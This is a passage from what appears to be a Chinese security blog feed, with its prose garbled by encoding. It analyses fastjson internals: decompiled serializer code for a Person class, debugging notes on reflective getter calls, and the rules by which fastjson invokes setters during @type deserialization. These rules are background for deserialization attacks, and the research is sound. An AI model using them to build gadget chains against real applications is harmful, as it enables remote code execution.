var9.write(<span class="number">125</span>);</span><br><span class="line">                    var1.setContext(var11);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeNormal</span><span class="params">(JSONSerializer var1, Object var2, Object var3, Type var4, <span class="type">int</span> var5)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">SerializeWriter</span> <span class="variable">var9</span> <span class="operator">=</span> var1.out;</span><br><span class="line">        <span class="keyword">if</span> (!var9.isSortField()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.writeUnsorted(var1, var2, var3, var4, var5);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Person</span> <span class="variable">var10</span> <span class="operator">=</span> (Person)var2;</span><br><span class="line">            <span class="keyword">if</span> (!var9.isEnabled(<span class="number">8192</span>) &amp;&amp; !var9.isEnabled(<span class="number">134217728</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.writeReference(var1, var2, var5)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var9.isEnabled(<span class="number">2097152</span>)) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.writeAsArrayNormal(var1, var2, var3, var4, var5);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">SerialContext</span> <span class="variable">var11</span> <span class="operator">=</span> var1.getContext();</span><br><span class="line">                        var1.setContext(var11, var2, var3, <span class="number">0</span>);</span><br><span class="line">                        <span class="type">byte</span> var10000;</span><br><span class="line">                        <span class="keyword">if</span> (var1.isWriteClassName(var4, var2) &amp;&amp; var4 != var2.getClass()) &#123;</span><br><span class="line">                            var9.write(<span class="number">123</span>);</span><br><span class="line">                            <span class="built_in">this</span>.writeClassName(var1, var2);</span><br><span class="line">                            var10000 = <span class="number">44</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            var10000 = <span class="number">123</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="type">char</span> <span class="variable">var12</span> <span class="operator">=</span> (<span class="type">char</span>)var10000;</span><br><span class="line">                        var12 = <span class="built_in">this</span>.writeBefore(var1, var2, var12);</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">var13</span> <span class="operator">=</span> var9.isNotWriteDefaultValue();</span><br><span class="line">                        var1.checkValue(<span class="built_in">this</span>);</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">var15</span> <span class="operator">=</span> var1.hasNameFilters(<span class="built_in">this</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="string">&quot;param1&quot;</span>;</span><br><span class="line">                        Object var8;</span><br><span class="line">                        String var16;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.applyName(var1, var2, var6) &amp;&amp; <span class="built_in">this</span>.applyLabel(var1, <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                            var16 = var10.getParam1();</span><br><span class="line">                            <span class="keyword">if</span> (var13) &#123;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (<span class="built_in">this</span>.apply(var1, var2, var6, var16)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (var15) &#123;</span><br><span class="line">                                    var6 = <span class="built_in">this</span>.processKey(var1, var2, var6, var16);</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                var8 = <span class="built_in">this</span>.processValue(var1, <span class="built_in">this</span>.getBeanContext(<span class="number">0</span>), var2, var6, var16);</span><br><span class="line">                                <span class="keyword">if</span> (var16 != var8) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (var8 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                                            var9.write(var12);</span><br><span class="line">                                            var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                            var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                                            var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        var9.write(var12);</span><br><span class="line">                                        var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                        var1.writeWithFieldName(var8, var6, String.class, <span class="number">0</span>);</span><br><span class="line">                                        var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var16 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                                        var9.write(var12);</span><br><span class="line">                                        var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                        var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                                        var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    var9.writeFieldValue(var12, var6, var16);</span><br><span class="line">                                    var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        var6 = <span class="string">&quot;param2&quot;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.applyName(var1, var2, var6) &amp;&amp; <span class="built_in">this</span>.applyLabel(var1, <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                            var16 = var10.getParam2();</span><br><span class="line">                            <span class="keyword">if</span> (var13) &#123;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (<span class="built_in">this</span>.apply(var1, var2, var6, var16)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (var15) &#123;</span><br><span class="line">                                    var6 = <span class="built_in">this</span>.processKey(var1, var2, var6, var16);</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                var8 = <span class="built_in">this</span>.processValue(var1, <span class="built_in">this</span>.getBeanContext(<span class="number">1</span>), var2, var6, var16);</span><br><span class="line">                                <span class="keyword">if</span> (var16 != var8) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (var8 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                                            var9.write(var12);</span><br><span class="line">                                            var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                            var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                                            var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        var9.write(var12);</span><br><span class="line">                                        var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                        var1.writeWithFieldName(var8, var6, String.class, <span class="number">0</span>);</span><br><span class="line">                                        var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var16 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                                        var9.write(var12);</span><br><span class="line">                                        var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                        var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                                        var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    var9.writeFieldValue(var12, var6, var16);</span><br><span class="line">                                    var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        var12 = <span class="built_in">this</span>.writeAfter(var1, var2, var12);</span><br><span class="line">                        <span class="keyword">if</span> (var12 == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                            var9.write(<span class="number">123</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        var9.write(<span class="number">125</span>);</span><br><span class="line">                        var1.setContext(var11);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.write(var1, var2, var3, var4, var5);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeDirectNonContext</span><span class="params">(JSONSerializer var1, Object var2, Object var3, Type var4, <span class="type">int</span> var5)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">SerializeWriter</span> <span class="variable">var9</span> <span class="operator">=</span> var1.out;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">var10</span> <span class="operator">=</span> (Person)var2;</span><br><span class="line">        <span class="keyword">if</span> (var9.isEnabled(<span class="number">2097152</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.writeAsArrayNonContext(var1, var2, var3, var4, var5);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="string">&#x27;&#123;&#x27;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="string">&quot;param1&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var12</span> <span class="operator">=</span> var10.getParam1();</span><br><span class="line">            <span class="keyword">if</span> (var12 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                    var9.write(var11);</span><br><span class="line">                    var9.writeFieldNameDirect(var6);</span><br><span class="line">                    var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                    var11 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var9.writeFieldValueStringWithDoubleQuoteCheck(var11, var6, var12);</span><br><span class="line">                var11 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var6 = <span class="string">&quot;param2&quot;</span>;</span><br><span class="line">            var12 = var10.getParam2();</span><br><span class="line">            <span class="keyword">if</span> (var12 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                    var9.write(var11);</span><br><span class="line">                    var9.writeFieldNameDirect(var6);</span><br><span class="line">                    var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                    var11 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var9.writeFieldValueStringWithDoubleQuoteCheck(var11, var6, var12);</span><br><span class="line">                var11 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var11 == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                var9.write(<span class="number">123</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var9.write(<span class="number">125</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeUnsorted</span><span class="params">(JSONSerializer var1, Object var2, Object var3, Type var4, <span class="type">int</span> var5)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">SerializeWriter</span> <span class="variable">var9</span> <span class="operator">=</span> var1.out;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">var10</span> <span class="operator">=</span> (Person)var2;</span><br><span class="line">        <span class="keyword">if</span> (!var9.isEnabled(<span class="number">8192</span>) &amp;&amp; !var9.isEnabled(<span class="number">134217728</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.writeReference(var1, var2, var5)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var9.isEnabled(<span class="number">2097152</span>)) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.writeAsArrayNormal(var1, var2, var3, var4, var5);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">SerialContext</span> <span class="variable">var11</span> <span class="operator">=</span> var1.getContext();</span><br><span class="line">                    var1.setContext(var11, var2, var3, <span class="number">0</span>);</span><br><span class="line">                    <span class="type">byte</span> var10000;</span><br><span class="line">                    <span class="keyword">if</span> (var1.isWriteClassName(var4, var2) &amp;&amp; var4 != var2.getClass()) &#123;</span><br><span class="line">                        var9.write(<span class="number">123</span>);</span><br><span class="line">                        <span class="built_in">this</span>.writeClassName(var1, var2);</span><br><span class="line">                        var10000 = <span class="number">44</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        var10000 = <span class="number">123</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">char</span> <span class="variable">var12</span> <span class="operator">=</span> (<span class="type">char</span>)var10000;</span><br><span class="line">                    var12 = <span class="built_in">this</span>.writeBefore(var1, var2, var12);</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">var13</span> <span class="operator">=</span> var9.isNotWriteDefaultValue();</span><br><span class="line">                    var1.checkValue(<span class="built_in">this</span>);</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">var15</span> <span class="operator">=</span> var1.hasNameFilters(<span class="built_in">this</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="string">&quot;param2&quot;</span>;</span><br><span class="line">                    Object var8;</span><br><span class="line">                    String var16;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.applyName(var1, var2, var6) &amp;&amp; <span class="built_in">this</span>.applyLabel(var1, <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                        var16 = var10.getParam2();</span><br><span class="line">                        <span class="keyword">if</span> (var13) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.apply(var1, var2, var6, var16)) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (var15) &#123;</span><br><span class="line">                                var6 = <span class="built_in">this</span>.processKey(var1, var2, var6, var16);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            var8 = <span class="built_in">this</span>.processValue(var1, <span class="built_in">this</span>.getBeanContext(<span class="number">1</span>), var2, var6, var16);</span><br><span class="line">                            <span class="keyword">if</span> (var16 != var8) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (var8 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                                        var9.write(var12);</span><br><span class="line">                                        var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                        var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                                        var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    var9.write(var12);</span><br><span class="line">                                    var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                    var1.writeWithFieldName(var8, var6, String.class, <span class="number">0</span>);</span><br><span class="line">                                    var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var16 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                                    var9.write(var12);</span><br><span class="line">                                    var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                    var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                                    var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                var9.writeFieldValue(var12, var6, var16);</span><br><span class="line">                                var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var6 = <span class="string">&quot;param1&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.applyName(var1, var2, var6) &amp;&amp; <span class="built_in">this</span>.applyLabel(var1, <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                        var16 = var10.getParam1();</span><br><span class="line">                        <span class="keyword">if</span> (var13) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.apply(var1, var2, var6, var16)) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (var15) &#123;</span><br><span class="line">                                var6 = <span class="built_in">this</span>.processKey(var1, var2, var6, var16);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            var8 = <span class="built_in">this</span>.processValue(var1, <span class="built_in">this</span>.getBeanContext(<span class="number">0</span>), var2, var6, var16);</span><br><span class="line">                            <span class="keyword">if</span> (var16 != var8) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (var8 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                                        var9.write(var12);</span><br><span class="line">                                        var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                        var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                                        var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    var9.write(var12);</span><br><span class="line">                                    var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                    var1.writeWithFieldName(var8, var6, String.class, <span class="number">0</span>);</span><br><span class="line">                                    var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var16 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                                    var9.write(var12);</span><br><span class="line">                                    var9.writeFieldName(var6, <span class="literal">false</span>);</span><br><span class="line">                                    var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                                    var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                var9.writeFieldValue(var12, var6, var16);</span><br><span class="line">                                var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var12 = <span class="built_in">this</span>.writeAfter(var1, var2, var12);</span><br><span class="line">                    <span class="keyword">if</span> (var12 == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                        var9.write(<span class="number">123</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var9.write(<span class="number">125</span>);</span><br><span class="line">                    var1.setContext(var11);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.write(var1, var2, var3, var4, var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeAsArray</span><span class="params">(JSONSerializer var1, Object var2, Object var3, Type var4, <span class="type">int</span> var5)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">SerializeWriter</span> <span class="variable">var9</span> <span class="operator">=</span> var1.out;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">var10</span> <span class="operator">=</span> (Person)var2;</span><br><span class="line">        var9.write(<span class="number">91</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="string">&quot;param1&quot;</span>;</span><br><span class="line">        var9.writeString(var10.getParam1(), <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        var6 = <span class="string">&quot;param2&quot;</span>;</span><br><span class="line">        var9.writeString(var10.getParam2(), <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeAsArrayNormal</span><span class="params">(JSONSerializer var1, Object var2, Object var3, Type var4, <span class="type">int</span> var5)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">SerializeWriter</span> <span class="variable">var9</span> <span class="operator">=</span> var1.out;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">var10</span> <span class="operator">=</span> (Person)var2;</span><br><span class="line">        var9.write(<span class="number">91</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="string">&quot;param1&quot;</span>;</span><br><span class="line">        var9.writeString(var10.getParam1(), <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        var6 = <span class="string">&quot;param2&quot;</span>;</span><br><span class="line">        var9.writeString(var10.getParam2(), <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeAsArrayNonContext</span><span class="params">(JSONSerializer var1, Object var2, Object var3, Type var4, <span class="type">int</span> var5)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">SerializeWriter</span> <span class="variable">var9</span> <span class="operator">=</span> var1.out;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">var10</span> <span class="operator">=</span> (Person)var2;</span><br><span class="line">        var9.write(<span class="number">91</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="string">&quot;param1&quot;</span>;</span><br><span class="line">        var9.writeString(var10.getParam1(), <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        var6 = <span class="string">&quot;param2&quot;</span>;</span><br><span class="line">        var9.writeString(var10.getParam2(), <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€å †writeæ–¹æ³•ï¼Œä¸€çœ¼é¡¶é’ˆä¸ºåºåˆ—åŒ–Personç±»ã€‚åºåˆ—åŒ–æˆä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬åé¢printç»“æœä¸ºjsonæ•°æ®ï¼Œå…¶å®å°±æ˜¯åºåˆ—åŒ–ä¸ºjsonäº†</p><p>è¯¥ç±»ç»§æ‰¿äº†JavaBeanSerializerï¼Œå¯ä»¥å¼ºè½¬ã€‚å¹¶è·å–äº†é”®å€¼å¯¹map</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134116824.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134116824.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134231257.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134231257.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸€æ­¥ä¹‹åå°±æ‰“å°äº†è°ƒç”¨getter</p><p>è·Ÿè¿›åˆ°getFieldValuesMapå†…ï¼Œå¾ªç¯è°ƒç”¨äº†getter.getPropertyValue</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134516899.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134516899.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¥ç€è°ƒç”¨getï¼Œä¸”è¿™é‡ŒfieldInfoå°±æ˜¯param1ä»¥åŠå¯¹åº”çš„getteræ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134816602.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134816602.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134854648.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134854648.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åå°„è°ƒç”¨getter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134916547.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006134916547.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŠŠè·å–åˆ°çš„é”®å€¼å¯¹ï¼ˆEntryï¼‰å¾ªç¯åŠ å…¥åˆ°jsonæ•°æ®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006135517974.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006135517974.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€åå¾—åˆ°æ²¡æœ‰@typeçš„æ•°æ®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006135609133.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006135609133.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ ¹æ®ä¸Šé¢çš„è°ƒè¯•ï¼Œå¾ˆå®¹æ˜“çŸ¥é“ï¼Œè°ƒç”¨ä¸å«JSON.toJSONçš„parseï¼Œå°±ä¸ä¼šè§¦å‘getterï¼ŒparseArrayå’Œä¸€äº›ä¸åŒå‚æ•°çš„parseObjectä¹Ÿä¸ä¼šï¼Œå…·ä½“çœ‹å…·ä½“ä»£ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006135958391.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006135958391.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>fastjsonæ ¹æ®@typeè¿˜åŸç±»ï¼Œæ˜¯åœ¨æœ¬åœ°ä»0å¼€å§‹å®ä¾‹åŒ–ï¼Œç„¶åè°ƒç”¨setterèµ‹å€¼</p><p>å¦‚æœè§£æå‡½æ•°é‡Œæœ‰JSON.toJSONï¼Œè¿˜ä¼šè°ƒç”¨getter</p><p>æŒ‰ä»¥ä¸‹é¡ºåºåˆ¤æ–­ï¼Œæ»¡è¶³æ¡ä»¶çš„è¯ï¼Œä¼šè¢«å½“æˆsetterè°ƒç”¨ï¼š</p><ul><li>setå¼€å¤´ï¼Œå‚æ•°é•¿åº¦ä¸º1ï¼Œéstaticï¼Œæ–¹æ³•åæ€»é•¿åº¦å¤§äº3</li><li>æ²¡æœ‰setteræ–¹æ³•ï¼Œæœ‰å­—æ®µæ˜¯boolç±»å‹ï¼Œåˆ™ç”¨<code>is</code>åŠ ä¸Šé¦–å­—æ¯å¤§å†™åçš„å­—æ®µå»æŸ¥æ‰¾ï¼ˆæ‰€ä»¥isNameè¿™ç§ä¹Ÿç®—setterï¼‰</li><li>æ²¡æœ‰setteræ–¹æ³•ï¼Œæœ‰getteræ–¹æ³•ï¼Œå‚æ•°é•¿åº¦ä¸º0ï¼Œè¿”å›ç±»å‹æ˜¯å±äºCollection æˆ–å…¶å­ç±»ã€Map æˆ–å…¶å­ç±»ã€AtomicBooleanã€AtomicIntegerã€AtomicLongçš„ä¸€ç§</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024SCTF Sysclover2åŸå‹é“¾æ±¡æŸ“ç¯å¢ƒå˜é‡</title>
